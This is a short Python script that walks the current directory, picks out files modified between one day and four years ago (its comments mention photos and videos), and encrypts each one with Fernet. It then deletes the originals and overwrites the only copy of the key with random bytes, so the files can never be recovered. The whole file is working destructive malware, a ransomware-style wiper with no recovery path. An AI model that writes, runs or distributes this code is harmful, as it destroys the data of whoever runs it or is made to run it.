import os
import time
from datetime import datetime
from cryptography.fernet import Fernet

def find_files_by_age(start_path='.'):
    now = time.time()
    found_files = []
    # Age range (1 day to 4 years in seconds)
    min_age = 1 * 24 * 60 * 60
    max_age = 4 * 365 * 24 * 60 * 60
    print("Searching for files that match the required age...\n")
    for root, directories, files in os.walk(start_path):
        # Avoid hidden system folders or control directories
        directories[:] = [d for d in directories if not d.startswith('.')]
        for filename in files:
            # Avoid encrypting files that were already encrypted previously
            if filename.endswith('.encrypted') or filename == 'secret.key':
                continue
            full_path = os.path.join(root, filename)
            try:
                mod_time = os.path.getmtime(full_path)
                file_age = now - mod_time
                # Filter by age range (photos, videos, etc.)
                if min_age <= file_age <= max_age:
                    found_files.append(full_path)
                    print(f"Found: {full_path}")
                    print(f"Modified: {datetime.fromtimestamp(mod_time)}")
            except (PermissionError, OSError):
                continue
    return found_files

# --- Configuration ---
search_directory = '.'

# 1. Search for all valid files first
valid_files = find_files_by_age(search_directory)

if valid_files:
    print(f"\nTotal files found: {len(valid_files)}")
    
    # 2. Generate and save the original encryption key
    key = Fernet.generate_key()
    with open('secret.key', 'wb') as key_file:
        key_file.write(key)
        
    # 3. Initialize the cipher
    cipher = Fernet(key)
    
    # Process each found file
    for final_path in valid_files:
        try:
            # 4. Read the found file (photo, video, etc.)
            with open(final_path, 'rb') as file:
                original_data = file.read()
                
            # 5. Encrypt the content
            encrypted_data = cipher.encrypt(original_data)
            
            # 6. Save the encrypted copy
            with open(f"{final_path}.encrypted", 'wb') as file:
                file.write(encrypted_data)
            print(f"File successfully encrypted!: {final_path}")
            
            # 7. Delete the original file
            os.remove(final_path)
            print(f"Original file {final_path} removed.")
        except (PermissionError, OSError) as error:
            print(f"Error processing {final_path}: {error}")
            
    # 8. OVERWRITE THE REAL KEY WITH RANDOM GARBAGE
    key_size = len(key)
    random_garbage = os.urandom(key_size)
    with open('secret.key', 'wb') as key_file:
        key_file.write(random_garbage)
    print("\nThe real key in secret.key has been overwritten with random data and destroyed.")
    print("Process finished.")
else:
    print("\nNo files found matching the age criteria.")
